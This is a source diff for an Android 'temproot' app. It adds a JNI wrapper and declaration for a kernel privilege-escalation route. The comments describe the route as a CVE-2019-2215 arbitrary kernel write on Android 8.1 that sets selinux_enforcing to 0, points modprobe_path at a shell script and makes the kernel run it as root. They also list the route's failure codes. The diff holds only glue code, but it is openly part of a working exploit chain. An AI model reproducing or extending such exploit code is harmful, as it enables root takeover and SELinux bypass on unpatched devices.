@@ -16,6 +16,9 @@
 extern int esc_probe(char *out, int cap);
 extern int esc_state(char *out, int cap);
 extern int esc_escalate_ex(const char *daemon, int rounds, char *out, int cap, int map_only);
+/* Route 8 (Android 8.1 / 3.18.71): CVE-2019-2215 arbitrary kernel write.  `payload` is a
+ * shell script -- the kernel-helper domain on this ROM cannot run a static libc ELF. */
+extern int esc_escalate8(const char *payload, int rounds, char *out, int cap);
 extern int esc_sugate(char *out, int cap);
 extern int esc_sugate_revert(char *out, int cap);
 extern int esc_sugate7_open(char *out, int cap);
@@ -224,6 +227,27 @@ Java_com_xplay6_temproot_Esc_nativeEscalate(JNIEnv *env, jobject thiz, jstring d
         return report(env, -1, "daemon path unavailable");
     rc = esc_escalate_ex(d, (int)rounds, buf, sizeof buf, (int)mapOnly);
     (*env)->ReleaseStringUTFChars(env, daemon, d);
+    return report(env, rc, buf);
+}
+
+/* Route 8: write selinux_enforcing=0 and modprobe_path=<script>, then make the kernel exec
+ * that script as uid 0 in the kernel domain.  rc -10/-11 = the enforcing write was missed or
+ * did not read back, -20/-21 = modprobe_path, -30 = the helper never opened 12346. */
+JNIEXPORT jstring JNICALL
+Java_com_xplay6_temproot_Esc_nativeEscalate8(JNIEnv *env, jobject thiz, jstring payload,
+                                             jint rounds)
+{
+    char buf[2048];
+    const char *p;
+    int rc;
+
+    (void) thiz;
+    buf[0] = 0;
+    p = (*env)->GetStringUTFChars(env, payload, NULL);
+    if (p == NULL)
+        return report(env, -1, "payload path unavailable");
+    rc = esc_escalate8(p, (int) rounds, buf, sizeof buf);
+    (*env)->ReleaseStringUTFChars(env, payload, p);
     return report(env, rc, buf);
 }
 
